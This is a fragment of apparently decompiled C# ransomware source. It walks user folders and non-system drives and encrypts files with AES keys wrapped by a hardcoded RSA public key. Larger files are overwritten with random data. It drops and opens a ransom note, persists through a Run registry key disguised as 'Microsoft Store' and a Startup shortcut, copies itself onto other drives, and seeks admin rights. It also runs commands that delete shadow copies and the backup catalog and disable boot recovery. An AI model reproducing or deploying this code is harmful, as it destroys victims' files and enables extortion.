		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>tXY9nPRI06jHHZwiaTGqmKeWThRlvwd+YjqXXT+aucvckCqu3eWqOEXdOTzuNG+xhpbxK+rfM/+0gTbtUQiEGw5/kfToR2Mw9jXikcLA+3cdshK88Mlv/JGu2bpZD8KRA0rZU3JCduizWtkWg7RPivY0vze1Dg2mX4ToIfgIvRk=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
